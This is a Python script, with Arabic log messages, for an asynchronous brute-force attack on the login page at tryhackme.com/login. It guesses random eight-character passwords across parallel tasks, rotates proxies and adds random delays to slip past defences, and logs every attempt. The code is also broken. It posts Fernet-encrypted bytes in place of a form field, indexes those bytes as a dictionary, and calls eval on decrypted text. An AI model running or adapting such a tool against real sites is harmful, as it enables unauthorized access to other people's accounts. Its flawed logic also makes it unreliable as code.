import aiohttp
import asyncio
import random
import string
import logging
from cryptography.fernet import Fernet

logging.basicConfig(filename='attack_log.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

key = Fernet.generate_key()
cipher_suite = Fernet(key)

proxy_pool = [
    "http://proxy1_address:port",
    "http://proxy2_address:port",
]

def encrypt_payload(payload):
    payload_str = str(payload).encode()
    encrypted_payload = cipher_suite.encrypt(payload_str)
    return encrypted_payload

def decrypt_payload(encrypted_payload):
    decrypted_payload = cipher_suite.decrypt(encrypted_payload).decode()
    return eval(decrypted_payload)

def generate_password(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

async def fetch(session, url, payload, proxy, timeout=10):
    try:
        async with session.post(url, data=payload, proxy=proxy, timeout=timeout) as response:
            text = await response.text()
            if "خطأ" not in text:
                logging.info(f"تم العثور على كلمة السر الصحيحة: {payload['password']}")
                print(f"تم العثور على كلمة السر الصحيحة: {payload['password']}")
                return payload['password']
    except asyncio.TimeoutError:
        logging.error(f"مهلة الطلب للبروكسي {proxy} انتهت.")
    except Exception as e:
        logging.error(f"خطأ أثناء الاتصال بالبروكسي {proxy}: {e}")
    return None

async def brute_force_attack(url, attempts, password_length, session):
    for attempt in range(attempts):
        proxy = random.choice(proxy_pool)
        password = generate_password(password_length)
        payload = {'password': password}
        encrypted_payload = encrypt_payload(payload)
        logging.info(f"محاولة {attempt} عبر البروكسي {proxy} باستخدام كلمة مرور {password}")

        result = await fetch(session, url, encrypted_payload, proxy)
        if result:
            return result
        await asyncio.sleep(random.uniform(0.5, 2))
    logging.info("فشلت جميع المحاولات!")
    return None

async def main(url, attempts, password_length, num_threads):
    async with aiohttp.ClientSession() as session:
        tasks = [brute_force_attack(url, attempts, password_length, session) for _ in range(num_threads)]
        results = await asyncio.gather(*tasks)
        for result in results:
            if result:
                print(f"كلمة السر المكتشفة: {result}")
                return
        print("لم يتم العثور على كلمة السر بعد جميع المحاولات.")

target_url = "https://tryhackme.com/login"
attempts_per_thread = 1000
password_length = 8
num_threads = 8

asyncio.run(main(target_url, attempts_per_thread, password_length, num_threads))